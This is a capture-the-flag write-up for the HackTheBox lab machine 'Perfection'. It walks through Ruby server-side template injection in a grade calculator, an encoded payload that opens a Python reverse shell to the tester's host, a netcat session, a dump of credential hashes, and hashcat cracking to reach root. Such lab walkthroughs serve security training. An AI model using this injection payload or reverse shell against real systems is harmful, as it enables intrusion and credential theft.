---
title: HTB:Perfection
date: 2024-03-15
categories: [HTB, LINUX]
tags: [htb, linux]     # TAG names should always be lowercase
image:
  path: https://i.ibb.co/ftpjjzd/perfection.jpg
---

## Enumeration

![nmap-scan](https://i.ibb.co/PF5YTgz/nmap-scan.jpg)

The initial Nmap scan reveals two open ports: SSH (22/tcp) and HTTP (80/tcp). SSH is running on Ubuntu Linux, while the web server is hosting a service titled "Weighted Grade Calculator" on nginx. 

![whatweb](https://i.ibb.co/ZhWc7kc/whatweb.jpg)

 Web server is running a combination of nginx and WEBrick with Ruby version 3.0.2
 
## WebApp

![web](https://i.ibb.co/pxQHQNj/web.jpg)

![calc](https://i.ibb.co/XXJnmDK/perfection-calc.jpg)

After figuring out Weight grade calc is Vulnerable to [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection), I tried some Ruby related SSTI payloads, since the WebApp is built with Ruby.

```ruby
<%= 7*7 %> = 49
```
![ssti](https://i.ibb.co/xqV1FWP/ssti.jpg)

## Reverse shell
 Generate a encoded reverse shell with [revshell.com](https://revshells.com/) 
 
    category1=mrx%0A<%25%3d+`python3+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.10.14.24",4444))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn("sh")'`+%25>&grade1=10&weight1=10&category2=b&grade2=20&weight2=20&category3=c&grade3=30&weight3=30&category4=d&grade4=20&weight4=20&category5=e&grade5=20&weight5=20
 
 ***%0A: newline character***

![shell](https://i.ibb.co/S6s9x91/reverse-shell.jpg)

Send the payload & catch the shell with Netcat listener.

![nc](https://i.ibb.co/6PQCyHM/nc.jpg)

## User Flag

    kali@kali ~ [1]> sudo nc -nvlp 4444
    listening on [any] 4444 ...
    connect to [10.10.14.24] from (UNKNOWN) [10.10.11.253] 60468
    $ python3 -c 'import pty; pty.spawn("/bin/bash")'
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    susan@perfection:~/ruby_app$ ls
    ls
    main.rb  public  views
    susan@perfection:~/ruby_app$ cd
    cd
    susan@perfection:~$ ls
    ls
    linpeas.sh  Migration  ruby_app  user.txt
    susan@perfection:~$ cat user.txt
    cat user.txt
    7b05f65f1ea8adeced421f18ad692d28

## Root Flag

After further enumerations , found a hash for Susan .

    susan@perfection:~$ cd Migration
    cd Migration
    susan@perfection:~/Migration$ ls
    ls
    pupilpath_credentials.db
    susan@perfection:~/Migration$ strings pupilpath_credentials.db
    strings pupilpath_credentials.db
    SQLite format 3
    tableusersusers
    CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    name TEXT,
    password TEXT
    Stephen Locke154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8S
    David Lawrenceff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87aP
    Harry Tylerd33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393O
    Tina Smithdd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57Q
    Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f

![mail](https://i.ibb.co/s2CMP1X/mail.jpg)

 Customize ​a mask and crack the hash with hashcat to retrieve the root access password.

    hashcat -m 1400 hash.txt -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d

```shell
sudo su
```

![root](https://i.ibb.co/NjF6wdn/root.jpg)
